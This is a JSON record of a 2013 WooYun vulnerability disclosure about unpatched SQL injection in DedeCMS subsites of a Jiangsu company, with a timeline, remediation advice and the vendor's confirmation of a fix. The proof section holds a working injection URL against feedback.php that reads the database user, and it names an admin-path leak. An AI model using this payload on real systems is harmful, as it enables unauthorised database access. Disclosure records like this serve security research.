{"id": 6237, "wybug_id": "wooyun-2013-045916", "wybug_title": "三艾公司某些分站补丁混乱随意注射", "wybug_corp": "江苏三艾网络科技有限公司", "wybug_author": "pandas", "wybug_date": "2013-12-20 15:56", "wybug_open_date": "2014-02-03 15:56", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-01-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-03：\t细节向公众公开  简要描述： 我是江苏人，所以对江苏的乌云厂商会留意多一些。打个比方：程序版本1.1到3.1的补丁也许有10个，难道打上10个补丁当中最后一个就万事大吉了吗？ 详细说明：  2个php的分站：test.cnaaa.com 和 help.cnaaa.com 均使用dedecms开源系统。其中从 data/admin/ver.txt 中可以判断help域名打上了最新的补丁，但也正如在简要描述当中说的一样，当补丁有10个的时候并非打上最后一个就万事。1. http://help.cnaaa.com/include/dialog/select_soft.php 得到后台：http://help.cnaaa.com/adminsj/login.php\n\n可以看到是5.3的版本，feedback的typeid注射这里并未修补，尝试读出了数据库名和用户名如下图：\n\n   漏洞证明：  同理 test.cnaaa.com的该注射漏洞也未修补：查询数据库用户名：http://test.cnaaa.com/plus/feedback.php?validate=SEYY&action=send&comtype=comments&fid=1&isconfirm=yes&msg=90sec&typeid=0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'),('1532','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0',user())%23等等...GET http://test.cnaaa.com//plus/feedback.php?aid=1532\n\n   修复方案：  1.好好打补丁，不要跳着打。2.请一个运维人员3.别用dedecms了   版权声明：转载请注明来源 pandas@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-12-20 16:41 厂商回复： 感谢您的提醒，我们正在尝试修复网站。 最新状态： 2013-12-21：已经修复该漏洞，感谢@pandas  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}